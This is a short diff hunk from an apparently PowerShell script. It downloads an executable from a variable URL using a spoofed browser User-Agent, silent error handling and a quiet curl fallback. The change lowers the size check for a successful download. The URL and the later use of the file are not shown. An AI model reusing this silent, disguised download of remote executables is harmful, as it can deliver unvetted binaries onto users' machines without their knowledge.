@@ -88,7 +88,7 @@ try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 40000)) { $downloaded = $true }
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 5000)) { $downloaded = $true }
 } catch {}
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
